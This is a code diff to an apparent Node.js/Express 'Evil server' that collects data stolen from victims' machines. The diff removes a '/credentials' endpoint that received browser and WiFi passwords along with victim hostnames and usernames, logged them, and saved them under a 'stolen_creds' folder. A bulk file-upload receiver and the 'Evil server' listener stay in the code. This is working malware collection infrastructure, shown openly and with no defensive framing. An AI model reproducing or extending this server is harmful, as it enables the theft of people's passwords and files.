@@ -35,20 +35,6 @@ app.post('/upload', upload.array('files', 50), (req, res) => {
     }
     res.status(200).send('Files received successfully');
 });
-app.post('/credentials', (req, res) => {
-    const { hostname, user, browser_passwords, wifi_passwords } = req.body;
-    console.log(`[+] Received credentials from ${hostname} (${user})`);
-    const credsPath = path.join(__dirname, 'stolen_creds', hostname);
-    if (!fs.existsSync(credsPath)) {
-        fs.mkdirSync(credsPath, { recursive: true });
-    }
-    const filename = `${Date.now()}_credentials.json`;
-    const filePath = path.join(credsPath, filename);
-    fs.writeFileSync(filePath, JSON.stringify(req.body, null, 2));
-    console.log(`[+] Saved ${browser_passwords?.length || 0} browser passwords`);
-    console.log(`[+] Saved ${wifi_passwords?.length || 0} WiFi passwords`);
-    res.status(200).send('Credentials received');
-});
 app.listen(process.env.PORT, "0.0.0.0",() => {
     console.log(`[+] Evil server listening on port ${process.env.PORT}`);
 });
